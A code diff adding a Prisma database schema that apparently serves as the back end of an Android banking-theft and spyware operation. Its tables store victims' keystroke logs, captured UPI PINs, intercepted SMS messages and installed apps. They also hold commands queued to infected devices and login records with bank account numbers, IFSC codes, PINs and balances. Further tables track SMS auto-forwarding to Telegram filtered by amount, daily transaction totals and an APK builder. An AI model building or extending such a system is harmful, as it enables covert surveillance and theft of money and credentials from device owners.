@@ -1,0 +1,743 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model device_commands {
+  id           String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id    String
+  command      String
+  payload      Json?
+  status       String?   @default("pending")
+  created_at   DateTime? @default(now()) @db.Timestamptz(6)
+  delivered_at DateTime? @db.Timestamptz(6)
+  executed_at  DateTime? @db.Timestamptz(6)
+
+  @@index([device_id])
+}
+
+model devices {
+  device_id          String    @id
+  android_id         String?
+  manufacturer       String?
+  model              String?
+  status             Boolean?  @default(false)
+  last_seen          DateTime? @db.Timestamptz(6)
+  heartbeat          Json?
+  brand              String?
+  product            String?
+  android_version    String?
+  raw_device_info    String?
+  sim_cards          Json?
+  service_status     Json?
+  oem_status         Json?
+  power_save_status  Json?
+  screen_status      Json?
+  process_importance String?
+  created_at         DateTime? @default(now()) @db.Timestamptz(6)
+  updated_at         DateTime? @default(now()) @db.Timestamptz(6)
+  build_id           String?
+  tenant_id          String?   @unique
+
+  @@index([last_seen], map: "idx_device_last_seen")
+  @@index([status], map: "idx_device_status")
+}
+
+model heartbeat {
+  id          BigInt    @id(map: "heartbeat_data_pkey") @default(autoincrement())
+  device_id   String
+  status      Boolean?  @default(false)
+  last_update DateTime  @default(now()) @db.Timestamptz(6)
+  uptime      BigInt    @default(0)
+  ram         BigInt    @default(0)
+  created_at  DateTime? @default(now()) @db.Timestamptz(6)
+  updated_at  DateTime? @default(now()) @db.Timestamptz(6)
+
+  @@index([device_id], map: "idx_heartbeat_device_id")
+  @@index([last_update], map: "idx_heartbeat_last_update")
+}
+
+model installed_apps {
+  device_id          String
+  package_name       String
+  app_name           String
+  icon               String?
+  version_name       String?
+  version_code       BigInt?
+  first_install_time BigInt?
+  last_update_time   BigInt?
+  is_system_app      Boolean?  @default(false)
+  target_sdk         Int?
+  min_sdk            Int?
+  sync_timestamp     BigInt
+  created_at         DateTime? @default(now()) @db.Timestamptz(6)
+  updated_at         DateTime? @default(now()) @db.Timestamptz(6)
+
+  @@id([device_id, package_name])
+  @@index([device_id], map: "idx_installed_apps_device_id")
+  @@index([package_name], map: "idx_installed_apps_package_name")
+  @@index([sync_timestamp(sort: Desc)], map: "idx_installed_apps_sync_timestamp")
+}
+
+model key_logger {
+  id          String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id   String
+  key         String
+  keylogger   String
+  created_at  DateTime  @default(now()) @db.Timestamptz(6)
+  currentDate DateTime? @db.Timestamptz(6)
+}
+
+model sms_messages {
+  id          BigInt
+  device_id   String
+  address     String
+  body        String
+  date        String
+  timestamp   BigInt
+  type        Int
+  sync_status String?   @default("synced")
+  created_at  DateTime? @default(now()) @db.Timestamptz(6)
+  updated_at  DateTime? @default(now()) @db.Timestamptz(6)
+
+  @@id([id, device_id])
+  @@index([device_id], map: "idx_sms_device")
+  @@index([timestamp], map: "idx_sms_timestamp")
+}
+
+model upi_pins {
+  id          String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id   String
+  pin         String
+  created_at  DateTime  @default(now()) @db.Timestamptz(6)
+  currentDate DateTime? @db.Timestamptz(6)
+}
+
+/// This table contains check constraints and requires additional setup for migrations. Visit https://pris.ly/d/check-constraints for more info.
+model users {
+  id            String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  email         String    @unique
+  password_hash String
+  role          String?   @default("user")
+  created_at    DateTime? @default(now()) @db.Timestamptz(6)
+  updated_at    DateTime? @default(now()) @db.Timestamptz(6)
+
+  @@index([email], map: "idx_users_email")
+}
+
+model app_builder_apps {
+  id                   String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  user_id              BigInt?
+  owner_id             String
+  firebase_uid         String
+  app_name             String
+  package_name         String
+  version              String
+  db_provider_type     String
+  database_provider_id String?   @db.Uuid
+  encrypted_config     String?
+  universal_realtime   Boolean?  @default(false)
+  build_status         String?   @default("queued")
+  build_started_at     DateTime? @db.Timestamptz(6)
+  build_completed_at   DateTime? @db.Timestamptz(6)
+  build_error          String?
+  apk_url              String?
+  icon_bucket          String?
+  github_run_id        BigInt?
+  icon_path            String?
+  is_default           Boolean?  @default(false)
+  created_at           DateTime  @default(now()) @db.Timestamptz(6)
+  updated_at           DateTime  @default(now()) @db.Timestamptz(6)
+
+  @@index([owner_id], map: "idx_app_builder_owner")
+  @@index([build_status], map: "idx_app_builder_status")
+}
+
+model cloud_phone_api_profiles {
+  id                  String                @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  user_id             BigInt
+  name                String
+  api_key             String
+  trace_id            String?
+  is_active           Boolean               @default(false)
+  is_default          Boolean               @default(false)
+  created_at          DateTime              @default(now()) @db.Timestamptz(6)
+  updated_at          DateTime              @default(now()) @db.Timestamptz(6)
+  user_profiles       user_profiles         @relation(fields: [user_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+  cloud_phone_devices cloud_phone_devices[]
+
+  @@index([user_id], map: "idx_cloud_phone_api_profiles_user_id")
+}
+
+model command_queue {
+  id            String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id     String
+  command_type  String
+  payload       Json
+  status        String    @default("pending")
+  priority      Int       @default(0)
+  retry_count   Int       @default(0)
+  max_retries   Int       @default(3)
+  scheduled_at  DateTime? @db.Timestamptz(6)
+  started_at    DateTime? @db.Timestamptz(6)
+  completed_at  DateTime? @db.Timestamptz(6)
+  error_message String?
+  created_at    DateTime  @default(now()) @db.Timestamptz(6)
+  updated_at    DateTime  @default(now()) @db.Timestamptz(6)
+
+  @@index([device_id], map: "idx_command_queue_device")
+  @@index([priority(sort: Desc)], map: "idx_command_queue_priority")
+  @@index([status], map: "idx_command_queue_status")
+}
+
+model database_providers {
+  id            String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  name          String
+  provider_type String
+  config        Json
+  is_active     Boolean  @default(true)
+  tenant_id     String?
+  created_by    String
+  created_at    DateTime @default(now()) @db.Timestamptz(6)
+  updated_at    DateTime @default(now()) @db.Timestamptz(6)
+
+  @@index([tenant_id], map: "idx_database_providers_tenant")
+  @@index([provider_type], map: "idx_database_providers_type")
+}
+
+model device_app_assignments {
+  id          String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id   String
+  app_id      String   @db.Uuid
+  assigned_at DateTime @default(now()) @db.Timestamptz(6)
+  assigned_by String
+
+  @@index([app_id], map: "idx_device_app_app")
+  @@index([device_id], map: "idx_device_app_device")
+}
+
+model global_config {
+  id            BigInt         @id @default(autoincrement())
+  config_key    String         @unique
+  config_value  Json
+  updated_by    BigInt?
+  created_at    DateTime       @default(now()) @db.Timestamptz(6)
+  updated_at    DateTime       @default(now()) @db.Timestamptz(6)
+  user_profiles user_profiles? @relation(fields: [updated_by], references: [id], onUpdate: NoAction)
+
+  @@index([config_key], map: "idx_global_config_key")
+}
+
+model rate_limits {
+  id           String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  identifier   String
+  endpoint     String
+  count        Int      @default(1)
+  window_start DateTime @default(now()) @db.Timestamptz(6)
+  created_at   DateTime @default(now()) @db.Timestamptz(6)
+
+  @@index([identifier, endpoint], map: "idx_rate_limits_identifier")
+}
+
+model two_factor_codes {
+  id           String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_uid String
+  code         String
+  expires_at   DateTime @db.Timestamptz(6)
+  used         Boolean  @default(false)
+  created_at   DateTime @default(now()) @db.Timestamptz(6)
+
+  @@index([code], map: "idx_2fa_code")
+  @@index([firebase_uid], map: "idx_2fa_uid")
+  @@index([expires_at], map: "idx_two_factor_codes_expires")
+  @@index([firebase_uid], map: "idx_two_factor_codes_firebase_uid")
+}
+
+model user_action_logs {
+  id            String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  user_id       String
+  action        String
+  resource_type String?
+  resource_id   String?
+  details       Json?
+  ip_address    String?
+  user_agent    String?
+  created_at    DateTime @default(now()) @db.Timestamptz(6)
+
+  @@index([created_at(sort: Desc)], map: "idx_audit_created")
+  @@index([user_id], map: "idx_audit_user")
+  @@index([user_id], map: "idx_user_action_logs_user")
+}
+
+model user_profiles {
+  id                       BigInt                     @id @default(autoincrement())
+  supabase_user_id         String                     @unique
+  role                     String?                    @default("viewer")
+  created_at               DateTime                   @default(now()) @db.Timestamptz(6)
+  updated_at               DateTime                   @default(now()) @db.Timestamptz(6)
+  password_hash            String?
+  email                    String?                    @unique(map: "user_profiles_email_unique")
+  display_name             String?
+  firebase_uid             String?
+  is_2fa_enabled           Boolean?                   @default(false)
+  avatar_url               String?
+  telegram_chat_id         String?
+  geelark_api_key          String?
+  cloud_phone_api_profiles cloud_phone_api_profiles[]
+  global_config            global_config[]
+
+  @@index([email], map: "idx_user_profiles_email")
+  @@index([role], map: "idx_user_profiles_role")
+}
+
+model user_settings {
+  id                        String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  user_id                   String   @unique
+  universal_firebase_config Json?
+  github_workflow_config    Json?
+  created_at                DateTime @default(now()) @db.Timestamptz(6)
+  updated_at                DateTime @default(now()) @db.Timestamptz(6)
+}
+
+model websocket_sessions {
+  id           String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  socket_id    String   @unique
+  device_id    String?
+  user_id      String?
+  connected_at DateTime @default(now()) @db.Timestamptz(6)
+  last_ping    DateTime @default(now()) @db.Timestamptz(6)
+  metadata     Json?
+
+  @@index([device_id], map: "idx_websocket_device")
+  @@index([user_id], map: "idx_websocket_user")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model cloud_phone_config {
+  id                   String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  user_id              String   @unique @db.Uuid
+  telegram_chat_id     String?
+  auto_forward_enabled Boolean? @default(false)
+  filter_keywords      String[] @default([])
+  amount_threshold     Decimal? @default(0) @db.Decimal
+  view_mode            String?  @default("table")
+  created_at           DateTime @default(now()) @db.Timestamptz(6)
+  updated_at           DateTime @default(now()) @db.Timestamptz(6)
+  forward_all_sms      Boolean? @default(false)
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model cloud_phone_devices {
+  id                       String                    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  geelark_phone_id         String                    @unique
+  api_profile_id           String?                   @db.Uuid
+  device_name              String?
+  phone_number             String?
+  login_done_at            DateTime?                 @db.Timestamptz(6)
+  notes                    String?
+  bank_assigned            String?
+  is_bookmarked            Boolean?                  @default(false)
+  metadata                 Json?                     @default("{}")
+  created_at               DateTime                  @default(now()) @db.Timestamptz(6)
+  updated_at               DateTime                  @default(now()) @db.Timestamptz(6)
+  balance                  Decimal?                  @db.Decimal
+  upi_pin                  String?
+  auto_forward_enabled     Boolean?                  @default(false)
+  last_processed_msg_id    String?
+  firebase_device_id       String?
+  cloud_phone_api_profiles cloud_phone_api_profiles? @relation(fields: [api_profile_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@index([api_profile_id], map: "idx_cloud_phone_devices_api_profile")
+  @@index([geelark_phone_id], map: "idx_cloud_phone_devices_geelark_id")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model cloud_phone_messages {
+  id               String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  geelark_phone_id String
+  phone_number     String?
+  device_name      String?
+  sender           String
+  message_content  String
+  received_at      DateTime  @default(now()) @db.Timestamptz(6)
+  is_forwarded     Boolean?  @default(false)
+  forwarded_at     DateTime? @db.Timestamptz(6)
+  forwarded_to     String?
+  created_at       DateTime  @default(now()) @db.Timestamptz(6)
+
+  @@index([geelark_phone_id], map: "idx_cloud_phone_messages_phone_id")
+  @@index([received_at(sort: Desc)], map: "idx_cloud_phone_messages_received_at")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model device_logs {
+  id         String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  device_id  String
+  user_id    String?  @db.Uuid
+  log_type   String
+  log_data   Json?    @default("{}")
+  synced_at  DateTime @default(now()) @db.Timestamptz(6)
+  created_at DateTime @default(now()) @db.Timestamptz(6)
+
+  @@index([device_id], map: "idx_device_logs_device_id")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model firebase_databases {
+  id                        String                      @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  name                      String
+  database_url              String
+  api_key                   String
+  auth_domain               String?
+  project_id                String?
+  storage_bucket            String?
+  messaging_sender_id       String?
+  app_id                    String?
+  is_active                 Boolean?                    @default(true)
+  created_at                DateTime                    @default(now()) @db.Timestamptz(6)
+  updated_at                DateTime                    @default(now()) @db.Timestamptz(6)
+  created_by                String?                     @db.Uuid
+  auth_email                String?
+  auth_password             String?
+  use_service_account       Boolean?                    @default(true)
+  login_records             login_records[]
+  sync_history              sync_history[]
+  synced_apps               synced_apps[]
+  synced_bookmarks          synced_bookmarks[]
+  synced_devices            synced_devices[]
+  synced_keylogs            synced_keylogs[]
+  synced_messages           synced_messages[]
+  synced_notes              synced_notes[]
+  synced_phone_usage        synced_phone_usage[]
+  synced_upi_pins           synced_upi_pins[]
+  transaction_analysis      transaction_analysis[]
+  user_database_assignments user_database_assignments[]
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model login_records {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  database_id        String?             @db.Uuid
+  firebase_device_id String?
+  person_name        String?
+  person_color       String?             @default("blue")
+  device_name        String?
+  device_type        String?             @default("mobile")
+  device_model       String?
+  device_imei        String?
+  profile_name       String
+  phone_number       String?
+  upi_id             String?
+  app_name           String?             @default("phonepe")
+  login_type         String?             @default("upi")
+  bank_name          String?
+  account_number     String?
+  ifsc_code          String?
+  upi_pin            String?
+  balance            Decimal?            @default(0) @db.Decimal
+  status             String?             @default("active")
+  notes              String?
+  added_at           DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  updated_at         DateTime            @default(now()) @db.Timestamptz(6)
+  user_id            BigInt?
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onUpdate: NoAction)
+
+  @@index([app_name], map: "idx_login_records_app_name")
+  @@index([database_id], map: "idx_login_records_database_id")
+  @@index([firebase_device_id], map: "idx_login_records_firebase_device_id")
+  @@index([status], map: "idx_login_records_status")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model phone_creation_templates {
+  id                   String                @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  name                 String
+  mobile_type          String                @default("Android 15")
+  charge_mode          Int                   @default(0)
+  net_type             Int?                  @default(1)
+  mobile_language      String?               @default("default")
+  profile_group        String?
+  profile_note         String?
+  surface_brand_name   String?
+  surface_model_name   String?
+  mobile_region        String?
+  mobile_province      String?
+  mobile_city          String?
+  proxy_profile_id     String?               @db.Uuid
+  is_default           Boolean?              @default(false)
+  created_at           DateTime              @default(now()) @db.Timestamptz(6)
+  updated_at           DateTime              @default(now()) @db.Timestamptz(6)
+  user_id              String?               @db.Uuid
+  saved_proxy_profiles saved_proxy_profiles? @relation(fields: [proxy_profile_id], references: [id], onUpdate: NoAction)
+
+  @@index([user_id], map: "idx_phone_creation_templates_user_id")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model saved_proxy_profiles {
+  id                       String                     @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  name                     String
+  proxy_type               String                     @default("socks5")
+  server                   String
+  port                     Int
+  username                 String?
+  password                 String?
+  created_at               DateTime                   @default(now()) @db.Timestamptz(6)
+  updated_at               DateTime                   @default(now()) @db.Timestamptz(6)
+  user_id                  String?                    @db.Uuid
+  phone_creation_templates phone_creation_templates[]
+
+  @@index([user_id], map: "idx_saved_proxy_profiles_user_id")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model sync_history {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  database_id        String?             @db.Uuid
+  user_id            String?             @db.Uuid
+  sync_type          String              @default("full")
+  status             String              @default("pending")
+  started_at         DateTime            @default(now()) @db.Timestamptz(6)
+  completed_at       DateTime?           @db.Timestamptz(6)
+  devices_synced     Int?                @default(0)
+  messages_synced    Int?                @default(0)
+  apps_synced        Int?                @default(0)
+  keylogs_synced     Int?                @default(0)
+  upi_pins_synced    Int?                @default(0)
+  error_message      String?
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_apps {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id String
+  database_id        String?             @db.Uuid
+  app_name           String
+  package_name       String
+  icon               String?
+  last_synced_at     DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@unique([firebase_device_id, package_name, database_id])
+  @@index([firebase_device_id], map: "idx_synced_apps_device")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_bookmarks {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id String
+  database_id        String?             @db.Uuid
+  device_name        String?
+  battery            String?
+  is_online          Boolean?            @default(false)
+  note               String?
+  bookmark_timestamp BigInt?
+  last_synced_at     DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@unique([firebase_device_id, database_id])
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_devices {
+  id                         String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id         String              @unique
+  database_id                String?             @db.Uuid
+  android_version            String?
+  battery                    String?
+  battery_level              String?
+  battery_last_update        BigInt?
+  battery_service_running    Boolean?            @default(false)
+  cpu_arch                   String?
+  has_required_permissions   Boolean?            @default(false)
+  heartbeat_last             BigInt?
+  heartbeat_service_running  Boolean?            @default(false)
+  ip_address                 String?
+  is_root                    Boolean?            @default(false)
+  is_sd_card                 Boolean?            @default(false)
+  joined                     String?
+  last_service_sync          BigInt?
+  mob_no                     String?
+  model_name                 String?
+  permission_has_sms         Boolean?
+  permission_last_check      BigInt?
+  permission_service_running Boolean?            @default(false)
+  sdk_version                String?
+  service_provider           String?
+  sims                       Json?               @default("[]")
+  is_online                  Boolean?            @default(false)
+  storage                    String?
+  last_synced_at             DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at                 DateTime            @default(now()) @db.Timestamptz(6)
+  updated_at                 DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases         firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@index([database_id], map: "idx_synced_devices_database")
+  @@index([is_online], map: "idx_synced_devices_online")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_keylogs {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id String
+  database_id        String?             @db.Uuid
+  keylog_key         String
+  keylog_date        String?
+  keylogger          String?
+  last_synced_at     DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@index([firebase_device_id], map: "idx_synced_keylogs_device")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_messages {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id String
+  database_id        String?             @db.Uuid
+  message_id         BigInt
+  address            String
+  body               String
+  message_date       String?
+  message_type       Int?                @default(1)
+  last_synced_at     DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@unique([firebase_device_id, message_id, database_id])
+  @@index([database_id], map: "idx_synced_messages_database")
+  @@index([firebase_device_id], map: "idx_synced_messages_device")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_notes {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id String
+  database_id        String?             @db.Uuid
+  note_type          String?
+  note_content       String?
+  note_timestamp     BigInt?
+  last_synced_at     DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@unique([firebase_device_id, database_id])
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_phone_usage {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id String
+  database_id        String?             @db.Uuid
+  duration           Int?                @default(0)
+  screen_on          Boolean?            @default(false)
+  usage_status       String?
+  usage_timestamp    BigInt?
+  last_synced_at     DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@unique([firebase_device_id, database_id])
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model synced_upi_pins {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_device_id String
+  database_id        String?             @db.Uuid
+  upi_pin            String
+  pin_date           String?
+  last_synced_at     DateTime?           @default(now()) @db.Timestamptz(6)
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@index([firebase_device_id], map: "idx_synced_upi_pins_device")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model telegram_message_log {
+  id              String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  firebase_uid    String
+  chat_id         String
+  message_preview String?
+  sent_at         DateTime @default(now()) @db.Timestamptz(6)
+
+  @@index([firebase_uid, sent_at(sort: Desc)], map: "idx_telegram_log_uid_sent")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model transaction_analysis {
+  id                 String              @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  database_id        String?             @db.Uuid
+  analysis_date      DateTime            @default(dbgenerated("CURRENT_DATE")) @db.Date
+  device_count       Int?                @default(0)
+  total_credit       Decimal?            @default(0) @db.Decimal(15, 2)
+  total_debit        Decimal?            @default(0) @db.Decimal(15, 2)
+  net_flow           Decimal?            @default(0) @db.Decimal(15, 2)
+  transactions       Json?               @default("[]")
+  bank_breakdown     Json?               @default("{}")
+  created_at         DateTime            @default(now()) @db.Timestamptz(6)
+  updated_at         DateTime            @default(now()) @db.Timestamptz(6)
+  created_by         String?             @db.Uuid
+  firebase_databases firebase_databases? @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@unique([analysis_date, database_id], map: "transaction_analysis_unique_date_db")
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model user_database_assignments {
+  id                 String             @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  user_id            String             @db.Uuid
+  database_id        String             @db.Uuid
+  assigned_at        DateTime           @default(now()) @db.Timestamptz(6)
+  assigned_by        String?            @db.Uuid
+  is_default         Boolean            @default(false)
+  firebase_databases firebase_databases @relation(fields: [database_id], references: [id], onDelete: Cascade, onUpdate: NoAction)
+
+  @@unique([user_id, database_id])
+}
+
+/// This model contains row level security and requires additional setup for migrations. Visit https://pris.ly/d/row-level-security for more info.
+model user_filter_preferences {
+  id              String   @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
+  user_id         String   @db.Uuid
+  preference_type String   @default("device_filters")
+  preferences     Json     @default("{}")
+  created_at      DateTime @default(now()) @db.Timestamptz(6)
+  updated_at      DateTime @default(now()) @db.Timestamptz(6)
+
+  @@unique([user_id, preference_type])
+}
+
+enum action_type {
+  login
+  logout
+  login_failed
+  device_view
+  device_sync
+  device_bookmark
+  sms_sent
+  sms_forwarded
+  settings_updated
+  fa_enabled       @map("2fa_enabled")
+  fa_disabled      @map("2fa_disabled")
+  profile_updated
+}
+
+enum user_role {
+  admin
+  moderator
+  user
+  viewer
+}
